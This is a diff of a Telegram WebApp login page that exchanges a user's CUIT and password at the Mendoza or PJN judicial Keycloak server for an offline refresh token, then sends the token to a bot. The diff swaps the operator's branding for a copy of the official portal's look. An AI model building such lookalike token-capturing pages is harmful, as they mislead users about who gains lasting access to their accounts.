@@ -3,23 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Iniciar Sesión — Portal Judicial</title>
+    <title>Plataforma Digital del Poder Judicial de Mendoza | Inicio de sesión</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root {
-            --primary: #1a3a5c;
-            --primary-light: #2c5282;
-            --accent: #2b6cb0;
-            --bg: #f7fafc;
-            --card-bg: #ffffff;
-            --text: #2d3748;
-            --text-muted: #718096;
-            --border: #e2e8f0;
-            --success: #38a169;
-            --error: #e53e3e;
-            --shadow: 0 4px 6px -1px rgba(0,0,0,0.1), 0 2px 4px -1px rgba(0,0,0,0.06);
-        }
-
         * {
             margin: 0;
             padding: 0;
@@ -27,429 +15,397 @@
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background: var(--bg);
-            color: var(--text);
+            font-family: Roboto, sans-serif;
+            background-color: #2c386b;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
+            justify-content: center;
             padding: 20px;
         }
 
-        .header {
-            text-align: center;
-            margin-bottom: 24px;
-            width: 100%;
-            max-width: 400px;
-        }
-
-        .logo-container {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 12px;
-            background: var(--primary);
-            border-radius: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: var(--shadow);
-        }
-
-        .logo-container svg {
-            width: 48px;
-            height: 48px;
-            fill: white;
-        }
-
-        .header h1 {
-            font-size: 18px;
-            color: var(--primary);
-            font-weight: 700;
-            line-height: 1.3;
-        }
-
-        .header .subtitle {
-            font-size: 13px;
-            color: var(--text-muted);
-            margin-top: 4px;
-        }
-
+        /* ── Card ─────────────────────────────────────── */
         .card {
-            background: var(--card-bg);
-            border-radius: 12px;
-            box-shadow: var(--shadow);
-            padding: 24px;
+            background: #ffffff;
+            box-shadow: rgba(0, 15, 31, 0.36) 9px 10px 6px -6px;
             width: 100%;
-            max-width: 400px;
+            max-width: 442px;
+            padding: 40px 70px;
         }
 
-        .form-group {
-            margin-bottom: 16px;
+        @media (max-width: 480px) {
+            .card { padding: 30px 28px; }
         }
 
-        .form-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: var(--text);
-            margin-bottom: 6px;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 12px 14px;
-            border: 2px solid var(--border);
-            border-radius: 8px;
-            font-size: 16px;
-            color: var(--text);
-            background: #fff;
-            transition: border-color 0.2s;
-            -webkit-appearance: none;
-        }
-
-        .form-group input:focus {
-            outline: none;
-            border-color: var(--accent);
-        }
-
-        .form-group input::placeholder {
-            color: #a0aec0;
-        }
-
-        .btn-submit {
-            width: 100%;
-            padding: 14px;
-            background: var(--primary);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s, transform 0.1s;
-            margin-top: 8px;
-        }
-
-        .btn-submit:hover {
-            background: var(--primary-light);
-        }
-
-        .btn-submit:active {
-            transform: scale(0.98);
-        }
-
-        .btn-submit:disabled {
-            background: #a0aec0;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .security-notice {
-            display: flex;
-            align-items: flex-start;
-            gap: 8px;
-            margin-top: 16px;
-            padding: 12px;
-            background: #f0fff4;
-            border-radius: 8px;
-            border: 1px solid #c6f6d5;
-        }
-
-        .security-notice .icon {
-            font-size: 16px;
-            flex-shrink: 0;
-            margin-top: 1px;
-        }
-
-        .security-notice p {
-            font-size: 12px;
-            color: #276749;
-            line-height: 1.4;
-        }
-
-        .status-msg {
+        /* ── Logo ─────────────────────────────────────── */
+        .logo-wrap {
             text-align: center;
-            padding: 10px;
-            border-radius: 8px;
-            font-size: 14px;
-            margin-top: 12px;
+            margin-bottom: 35px;
+        }
+
+        .logo-wrap img {
+            max-height: 95px;
+            max-width: 100%;
+        }
+
+        /* Fallback si la imagen no carga */
+        .logo-fallback {
             display: none;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
         }
 
-        .status-msg.error {
-            display: block;
-            background: #fff5f5;
-            color: var(--error);
-            border: 1px solid #fed7d7;
+        .logo-fallback .escudo {
+            width: 70px;
+            height: 70px;
         }
 
-        .status-msg.success {
+        .logo-fallback .text-pj {
+            font-size: 16px;
+            font-weight: 700;
+            color: #2c386b;
+            letter-spacing: 1px;
+        }
+
+        .logo-fallback .text-mza {
+            font-size: 11px;
+            color: #495057;
+            letter-spacing: 2px;
+        }
+
+        /* ── Inputs ───────────────────────────────────── */
+        .inputs-wrap {
+            margin-bottom: 20px;
+        }
+
+        .inputs-wrap input {
             display: block;
-            background: #f0fff4;
-            color: var(--success);
-            border: 1px solid #c6f6d5;
+            width: 100%;
+            padding: 10px;
+            border: 0.8px solid #ced4da;
+            border-radius: 0;
+            font-family: Roboto, sans-serif;
+            font-size: 14px;
+            color: #495057;
+            background: #ffffff;
+            outline: none;
+            /* Overlap borders so they share the middle line */
+            margin-bottom: -0.8px;
+            position: relative;
+            z-index: 0;
+            transition: border-left 0.1s;
+        }
+
+        .inputs-wrap input:focus {
+            border-left: 3px solid #4272d7;
+            z-index: 1;
+        }
+
+        .inputs-wrap input::placeholder {
+            color: #6c757d;
+        }
+
+        /* ── Status messages ──────────────────────────── */
+        .status-msg {
+            display: none;
+            font-size: 13px;
+            padding: 8px 10px;
+            margin-bottom: 12px;
+            text-align: center;
+            line-height: 1.4;
         }
 
         .status-msg.loading {
             display: block;
-            background: #ebf8ff;
-            color: var(--accent);
-            border: 1px solid #bee3f8;
+            color: #4272d7;
+        }
+
+        .status-msg.error {
+            display: block;
+            color: #842029;
+            background: #f8d7da;
+            border: 0.8px solid #f5c2c7;
+        }
+
+        .status-msg.success {
+            display: block;
+            color: #0f5132;
+            background: #d1e7dd;
+            border: 0.8px solid #badbcc;
         }
 
         .spinner {
             display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid #bee3f8;
-            border-top-color: var(--accent);
+            width: 12px;
+            height: 12px;
+            border: 2px solid #b3c8f7;
+            border-top-color: #4272d7;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+            animation: spin 0.7s linear infinite;
             vertical-align: middle;
             margin-right: 6px;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ── Botón INGRESAR ───────────────────────────── */
+        .btn-ingresar {
+            display: block;
+            width: 100%;
+            padding: 8px 16px;
+            background: #4272d7;
+            color: #ffffff;
+            border: 0.8px solid #4272d7;
+            border-radius: 0;
+            font-family: Roboto, sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            margin-bottom: 18px;
+            transition: background 0.15s;
         }
 
-        .portal-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 4px;
-            padding: 4px 10px;
-            background: var(--primary);
-            color: white;
-            border-radius: 12px;
-            font-size: 11px;
-            font-weight: 600;
-            margin-top: 8px;
+        .btn-ingresar:hover:not(:disabled) {
+            background: #3461c4;
+            border-color: #3461c4;
         }
 
-        .footer {
-            margin-top: 20px;
+        .btn-ingresar:disabled {
+            background: #7a9de0;
+            border-color: #7a9de0;
+            cursor: not-allowed;
+        }
+
+        /* ── Links ────────────────────────────────────── */
+        .links {
+            text-align: center;
+        }
+
+        .links a {
+            display: block;
+            color: #495057;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 10px;
+            cursor: pointer;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+            color: #2c386b;
+        }
+
+        /* ── Nota de seguridad (fuera del card) ────────── */
+        .security-note {
+            margin-top: 14px;
             text-align: center;
             font-size: 11px;
-            color: var(--text-muted);
-            max-width: 400px;
+            color: rgba(255, 255, 255, 0.55);
+            max-width: 442px;
+            line-height: 1.5;
         }
 
-        .footer a {
-            color: var(--accent);
-            text-decoration: none;
+        .security-note b {
+            color: rgba(255, 255, 255, 0.8);
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <div class="logo-container">
-            <!-- Balanza de justicia SVG -->
-            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12 2L12 4M12 4L4 8L4 10C4 12.2091 5.79086 14 8 14C10.2091 14 12 12.2091 12 10L12 4M12 4L20 8L20 10C20 12.2091 18.2091 14 16 14C13.7909 14 12 12.2091 12 10M12 14L12 20M8 20L16 20" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
-            </svg>
-        </div>
-        <h1 id="portal-title">Poder Judicial de Mendoza</h1>
-        <div class="subtitle" id="portal-subtitle">IOL — Iurix Online</div>
-        <div class="portal-badge" id="portal-badge">
-            <span>&#128274;</span> Conexión segura
-        </div>
-    </div>
 
     <div class="card">
-        <form id="login-form" autocomplete="off">
-            <div class="form-group">
-                <label for="username" id="label-user">CUIT / Usuario</label>
-                <input type="text" id="username" name="username"
-                       placeholder="Ej: 20123456789" autocomplete="off"
-                       inputmode="numeric" required>
+
+        <!-- Logo oficial -->
+        <div class="logo-wrap">
+            <img
+                id="logo-img"
+                src="https://iol.jus.mendoza.gov.ar/auth/resources/grg6s/login/iol-mendoza/img/logo-transparente.png"
+                alt="Poder Judicial Provincia de Mendoza"
+                onerror="this.style.display='none'; document.getElementById('logo-fallback').style.display='flex';"
+            >
+            <!-- Fallback SVG si la imagen no carga -->
+            <div id="logo-fallback" class="logo-fallback">
+                <svg class="escudo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="50" cy="50" r="48" fill="#2c386b" stroke="#aaa" stroke-width="2"/>
+                    <text x="50" y="45" text-anchor="middle" fill="white" font-size="9" font-family="Roboto,sans-serif" font-weight="bold">PODER</text>
+                    <text x="50" y="57" text-anchor="middle" fill="white" font-size="9" font-family="Roboto,sans-serif" font-weight="bold">JUDICIAL</text>
+                    <text x="50" y="70" text-anchor="middle" fill="#ddd" font-size="7" font-family="Roboto,sans-serif">MENDOZA</text>
+                </svg>
             </div>
+        </div>
 
-            <div class="form-group">
-                <label for="password">Contraseña</label>
-                <input type="password" id="password" name="password"
-                       placeholder="Tu contraseña del portal" autocomplete="off"
-                       required>
-            </div>
+        <!-- Formulario -->
+        <form id="login-form" autocomplete="off" novalidate>
 
-            <button type="submit" class="btn-submit" id="btn-submit">
-                Iniciar sesión
-            </button>
-
+            <!-- Mensajes de estado -->
             <div id="status" class="status-msg"></div>
 
-            <div class="security-notice">
-                <span class="icon">&#128274;</span>
-                <p>
-                    Tu contraseña se envía <b>directamente</b> al servidor oficial del
-                    Poder Judicial mediante conexión HTTPS encriptada.
-                    <b>Nunca pasa por nuestros servidores.</b>
-                    Solo almacenamos un token de sesión revocable.
-                </p>
+            <!-- Inputs -->
+            <div class="inputs-wrap">
+                <input
+                    type="text"
+                    id="username"
+                    name="username"
+                    placeholder="CUIT"
+                    inputmode="numeric"
+                    autocomplete="off"
+                    autocorrect="off"
+                    autocapitalize="off"
+                    spellcheck="false"
+                    required
+                >
+                <input
+                    type="password"
+                    id="password"
+                    name="password"
+                    placeholder="Contraseña"
+                    autocomplete="current-password"
+                    required
+                >
             </div>
+
+            <!-- Botón -->
+            <button type="submit" class="btn-ingresar" id="btn-submit">
+                INGRESAR
+            </button>
+
+            <!-- Links (igual al portal oficial) -->
+            <div class="links">
+                <a href="https://iol.jus.mendoza.gov.ar/iol-ui/p/inicio" target="_blank" rel="noopener">
+                    Crear Usuario
+                </a>
+                <a href="https://iol.jus.mendoza.gov.ar/auth/realms/iol-mendoza/login-actions/reset-credentials" target="_blank" rel="noopener">
+                    Recuperar Contraseña
+                </a>
+            </div>
+
         </form>
     </div>
 
-    <div class="footer">
-        <p>
-            Este formulario conecta directamente con
-            <span id="footer-server">iol.jus.mendoza.gov.ar</span>
-        </p>
-        <p style="margin-top:4px;">
-            <a href="https://www.enlista.com.ar" target="_blank">enlista.com.ar</a>
-            — Asistente Judicial
-        </p>
+    <!-- Nota de seguridad discreta fuera del card -->
+    <div class="security-note">
+        Tu contraseña se envía <b>directamente</b> al servidor oficial del Poder Judicial
+        (HTTPS). <b>Nunca pasa por nuestros servidores.</b>
     </div>
 
     <script>
-    (function() {
+    (function () {
         'use strict';
 
-        // ── Configuración por portal ─────────────────────
+        /* ── Configuración por portal ──────────────────── */
         const PORTALS = {
             iol: {
-                title: 'Poder Judicial de Mendoza',
-                subtitle: 'IOL — Iurix Online',
                 tokenUrl: 'https://iol.jus.mendoza.gov.ar/auth/realms/iol-mendoza/protocol/openid-connect/token',
                 clientId: 'iol-ui',
                 scope: 'openid offline_access',
-                userLabel: 'CUIT / Usuario',
-                userPlaceholder: 'Ej: 20123456789',
-                inputMode: 'numeric',
-                server: 'iol.jus.mendoza.gov.ar',
             },
             pjn: {
-                title: 'Poder Judicial de la Nación',
-                subtitle: 'Portal PJN — SSO Keycloak',
                 tokenUrl: 'https://sso.pjn.gov.ar/auth/realms/pjn/protocol/openid-connect/token',
                 clientId: 'pjn-portal',
                 scope: 'openid',
-                userLabel: 'CUIL / CUIT',
-                userPlaceholder: 'Ej: 20123456789',
-                inputMode: 'numeric',
-                server: 'sso.pjn.gov.ar',
             }
         };
 
-        // Detectar portal desde query string
-        const params = new URLSearchParams(window.location.search);
+        const params  = new URLSearchParams(window.location.search);
         const portalKey = params.get('portal') || 'iol';
-        const portal = PORTALS[portalKey] || PORTALS.iol;
+        const portal  = PORTALS[portalKey] || PORTALS.iol;
 
-        // Actualizar UI
-        document.getElementById('portal-title').textContent = portal.title;
-        document.getElementById('portal-subtitle').textContent = portal.subtitle;
-        document.getElementById('label-user').textContent = portal.userLabel;
-        document.getElementById('footer-server').textContent = portal.server;
-
-        const usernameInput = document.getElementById('username');
-        usernameInput.placeholder = portal.userPlaceholder;
-        usernameInput.inputMode = portal.inputMode;
-
-        // ── Telegram WebApp ──────────────────────────────
+        /* ── Telegram WebApp ────────────────────────────── */
         const tg = window.Telegram && window.Telegram.WebApp;
         if (tg) {
             tg.ready();
             tg.expand();
         }
 
-        // ── Form submit ──────────────────────────────────
-        const form = document.getElementById('login-form');
-        const btn = document.getElementById('btn-submit');
+        /* ── Helpers UI ─────────────────────────────────── */
         const statusEl = document.getElementById('status');
+        const btn      = document.getElementById('btn-submit');
 
         function showStatus(msg, type) {
             statusEl.className = 'status-msg ' + type;
-            if (type === 'loading') {
-                statusEl.innerHTML = '<span class="spinner"></span>' + msg;
-            } else {
-                statusEl.textContent = msg;
-            }
+            statusEl.innerHTML = type === 'loading'
+                ? '<span class="spinner"></span>' + msg
+                : msg;
         }
 
-        form.addEventListener('submit', async function(e) {
+        function resetBtn() {
+            btn.disabled    = false;
+            btn.textContent = 'INGRESAR';
+        }
+
+        /* ── Submit ─────────────────────────────────────── */
+        document.getElementById('login-form').addEventListener('submit', async function (e) {
             e.preventDefault();
 
-            const username = usernameInput.value.trim();
+            const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value;
 
             if (!username || !password) {
-                showStatus('Completá todos los campos.', 'error');
+                showStatus('Completá CUIT y contraseña.', 'error');
                 return;
             }
 
-            btn.disabled = true;
+            btn.disabled    = true;
             btn.textContent = 'Conectando...';
-            showStatus('Conectando con el servidor del Poder Judicial...', 'loading');
+            showStatus('Verificando credenciales...', 'loading');
 
             try {
-                // POST directo al Keycloak del PJ (CORS permitido)
                 const body = new URLSearchParams({
                     grant_type: 'password',
-                    client_id: portal.clientId,
-                    username: username,
-                    password: password,
-                    scope: portal.scope,
+                    client_id:  portal.clientId,
+                    username:   username,
+                    password:   password,
+                    scope:      portal.scope,
                 });
 
                 const resp = await fetch(portal.tokenUrl, {
-                    method: 'POST',
+                    method:  'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: body.toString(),
+                    body:    body.toString(),
                 });
 
                 if (!resp.ok) {
-                    const errData = await resp.json().catch(() => ({}));
-                    const errMsg = errData.error_description || errData.error || 'Credenciales incorrectas';
-                    throw new Error(errMsg);
+                    const err = await resp.json().catch(() => ({}));
+                    throw new Error(err.error_description || err.error || 'Error de autenticación');
                 }
 
                 const data = await resp.json();
 
                 if (!data.refresh_token) {
-                    throw new Error('El servidor no devolvió un token de sesión.');
+                    throw new Error('El servidor no devolvió token de sesión.');
                 }
 
-                showStatus('Sesión iniciada correctamente.', 'success');
-                btn.textContent = 'Listo!';
+                showStatus('Sesión iniciada. Cerrando...', 'success');
+                btn.textContent = '✓';
 
-                // Enviar datos al bot de Telegram
                 const payload = JSON.stringify({
-                    portal: portalKey,
-                    cuit: username,
+                    portal:        portalKey,
+                    cuit:          username,
                     refresh_token: data.refresh_token,
                 });
 
                 if (tg && tg.sendData) {
-                    // Pequeña pausa para que el usuario vea el mensaje de éxito
-                    setTimeout(function() {
-                        tg.sendData(payload);
-                    }, 800);
+                    setTimeout(() => tg.sendData(payload), 700);
                 } else {
-                    // Fallback: modo desarrollo (no estamos en Telegram)
-                    console.log('WebApp sendData payload:', payload);
-                    showStatus(
-                        'Token obtenido. (Modo dev — abrí desde Telegram para enviar al bot)',
-                        'success'
-                    );
-                    btn.disabled = false;
-                    btn.textContent = 'Iniciar sesión';
+                    // Modo desarrollo (fuera de Telegram)
+                    console.log('[dev] sendData payload:', payload);
+                    showStatus('Token OK (modo dev — abrí desde Telegram para enviar al bot).', 'success');
+                    resetBtn();
                 }
 
             } catch (err) {
                 console.error('Login error:', err);
-                let userMsg = err.message;
-
-                // Mensajes amigables
-                if (userMsg.includes('Invalid user credentials') || userMsg.includes('invalid_grant')) {
-                    userMsg = 'Usuario o contraseña incorrectos. Verificá tus datos.';
-                } else if (userMsg.includes('Failed to fetch') || userMsg.includes('NetworkError')) {
-                    userMsg = 'No se pudo conectar con el servidor. Verificá tu conexión a internet.';
+                let msg = err.message;
+                if (/invalid.*(user|grant|credentials)/i.test(msg)) {
+                    msg = 'CUIT o contraseña incorrectos.';
+                } else if (/fetch|network/i.test(msg)) {
+                    msg = 'Sin conexión con el servidor. Verificá tu internet.';
                 }
-
-                showStatus(userMsg, 'error');
-                btn.disabled = false;
-                btn.textContent = 'Iniciar sesión';
+                showStatus(msg, 'error');
+                resetBtn();
             }
         });
     })();
